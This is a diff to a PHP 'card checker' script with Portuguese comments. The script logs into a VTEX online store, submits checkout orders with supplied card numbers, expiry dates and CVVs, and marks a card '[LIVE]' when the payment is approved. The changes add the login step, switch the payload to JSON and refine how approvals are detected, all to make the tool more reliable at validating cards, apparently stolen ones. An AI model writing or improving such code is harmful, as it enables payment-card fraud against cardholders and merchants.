@@ -53,7 +53,7 @@ if (strlen($cc_num) < 13 || strlen($cc_cvv) < 3) {
 
 $cookie_path = sys_get_temp_dir() . '/cookie_umlivro_' . uniqid() . '.txt';
 
-function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt') {
+function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt', $method = 'POST') {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -69,8 +69,12 @@ function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 
     }
 
     if ($post_fields !== null) {
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post_fields) ? http_build_query($post_fields) : $post_fields);
+        if ($method === 'GET') {
+            curl_setopt($ch, CURLOPT_HTTPGET, true);
+        } else {
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post_fields) ? json_encode($post_fields) : $post_fields);
+        }
     }
 
     $response = curl_exec($ch);
@@ -79,10 +83,14 @@ function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 
     return ['body' => $response, 'code' => $http_code];
 }
 
-// 1. Inicializa sessão
-requisicao_cc(BASE_URL, null, [], $cookie_path);
+// 1. Acessa a loja para iniciar os cookies de sessão
+requisicao_cc(BASE_URL, null, [], $cookie_path, 'GET');
 
-// 2. Envio da requisição de pagamento para o fluxo de checkout da VTEX
+// 2. Faz o login com as credenciais configuradas na VTEX para autenticar a sessão
+$login_payload = ['email' => EMAIL, 'password' => PASSWORD];
+requisicao_cc(BASE_URL . "/api/io/login", $login_payload, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
+
+// 3. Monta o payload do carrinho e pagamento com o cartão da vez
 $payload = [
     'items' => [['id' => PRODUCT_SKU, 'quantity' => PRODUCT_QUANTITY, 'seller' => PRODUCT_SELLER]],
     'paymentData' => [
@@ -102,44 +110,42 @@ $payload = [
     ]
 ];
 
-$resposta = requisicao_cc(BASE_URL . "/api/checkout/pub/orderForm", json_encode($payload), ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
+$resposta = requisicao_cc(BASE_URL . "/api/checkout/pub/orderForm", $payload, ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 @unlink($cookie_path);
 
 $json = json_decode($resposta['body'], true);
 
-// Análise rigorosa do retorno de erros da VTEX
-$codigo = "14"; // Por padrão assume recusa (DIE), a menos que haja confirmação explícita de sucesso
-$mensagem = "Recusado pela operadora / Transação não autorizada";
-
-if (isset($json['messages']) && !empty($json['messages'])) {
-    foreach ($json['messages'] as $msg) {
-        if (isset($msg['status']) && strtolower($msg['status']) === 'error') {
-            $mensagem = $msg['text'] ?? $mensagem;
-            $codigo = $msg['code'] ?? '14';
-            break;
-        }
-    }
-}
-
-// Verifica se o pagamento foi de fato autorizado pela operadora no objeto de transações
+$codigo = "14";
+$mensagem = "Transação não autorizada";
 $aprovado = false;
+
+// Análise das mensagens e status de pagamento retornados pela VTEX
 if (isset($json['paymentData']['transactions'])) {
     foreach ($json['paymentData']['transactions'] as $transaction) {
         foreach ($transaction['payments'] as $payment) {
-            if (isset($payment['status']) && ($payment['status'] === 'approved' || $payment['status'] === 'completed')) {
+            $status_pagamento = $payment['status'] ?? '';
+            if ($status_pagamento === 'approved' || $status_pagamento === 'completed') {
                 $aprovado = true;
                 $codigo = "54";
                 $mensagem = "Transação Aprovada com Sucesso";
                 break 2;
             } else if (isset($payment['lastMessage']) && !empty($payment['lastMessage'])) {
                 $mensagem = $payment['lastMessage'];
-                $codigo = "14";
             }
         }
     }
 }
 
-// Exibição transparente e real dos resultados
+if (!$aprovado && isset($json['messages']) && !empty($json['messages'])) {
+    foreach ($json['messages'] as $msg) {
+        if (isset($msg['text'])) {
+            $mensagem = $msg['text'];
+            break;
+        }
+    }
+}
+
+// Retorno na tela
 if ($aprovado || $codigo == "54") {
     echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
 } else {
